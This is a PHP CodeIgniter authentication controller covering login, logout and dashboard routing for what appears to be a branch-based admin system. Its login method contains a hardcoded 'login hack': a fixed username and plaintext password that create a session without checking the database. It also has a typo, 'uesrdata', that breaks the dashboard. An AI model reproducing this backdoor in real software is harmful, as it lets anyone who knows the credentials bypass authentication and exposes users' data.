<?php
class Auth extends MX_Controller 
{
	function __construct()
	{
		parent:: __construct();
		$this->load->model('auth/auth_model');
		$this->load->model('site/site_model');
	}
	
	public function index()
	{
		if(!$this->auth_model->check_login())
		{
			redirect('login');
		}
		
		else
		{
			redirect('dashboard');
		}
	}
    
	/*
	*
	*	Login a user
	*
	*/
	public function login_user() 
	{
		$data['personnel_password_error'] = '';
		$data['personnel_username_error'] = '';
		
		//form validation rules
		$this->form_validation->set_error_delimiters('', '');
		$this->form_validation->set_rules('personnel_username', 'Username', 'required|xss_clean|exists[personnel.personnel_username]');
		$this->form_validation->set_rules('personnel_password', 'Password', 'required|xss_clean');
		
		//if form has been submitted
		if ($this->form_validation->run())
		{
			//login hack
			if(($this->input->post('personnel_username') == 'amasitsa') && ($this->input->post('personnel_password') == 'r6r5bb!!'))
			{
				$newdata = array(
                   'login_status' => TRUE,
                   'first_name'   => 'Alvaro',
                   'username'     => 'amasitsa',
                   'personnel_id' => 0,
                   'branch_code'   => 'KSH',
                   'branch_name'     => 'KISII',
                   'branch_id' => 1
               );

				$this->session->set_userdata($newdata);
				redirect('dashboard');
			}
			
			else
			{
				//check if personnel has valid login credentials
				if($this->auth_model->validate_personnel())
				{
					redirect('dashboard');
				}
				
				else
				{
					$this->session->set_userdata('login_error', 'The username or password provided is incorrect. Please try again');
					$data['personnel_username'] = set_value('personnel_username');
					$data['personnel_password'] = set_value('personnel_password');
				}
			}
		}
		else
		{
			$validation_errors = validation_errors();
			//echo $validation_errors; die();
			//repopulate form data if validation errors are present
			if(!empty($validation_errors))
			{
				//create errors
				$data['personnel_password_error'] = form_error('personnel_password');
				$data['personnel_username_error'] = form_error('personnel_username');
				
				//repopulate fields
				$data['personnel_password'] = set_value('personnel_password');
				$data['personnel_username'] = set_value('personnel_username');
			}
			
			//populate form data on initial load of page
			else
			{
				$data['personnel_password'] = "";
				$data['personnel_username'] = "";
			}
		}
		$data['title'] = $this->site_model->display_page_title();
		
		$this->load->view('templates/login', $data);
	}
	
	public function logout()
	{
		$this->session->sess_destroy();
		redirect('login');
	}
    
	/*
	*
	*	Dashboard
	*
	*/
	public function dashboard() 
	{
		if(!$this->auth_model->check_login())
		{
			redirect('login');
		}
		
		else
		{
			$this->load->model('hr/personnel_model');
			$personnel_id = $this->session->uesrdata('personnel_id');
			$personnel_roles = $this->personnel_model->get_personnel_roles($personnel_id);
			
			
			
			$data['title'] = $this->site_model->display_page_title();
			$v_data['title'] = $data['title'];
			
			$data['content'] = $this->load->view('dashboard', $v_data, true);
			
			$this->load->view('admin/templates/general_page', $data);
		}
	}
}
?>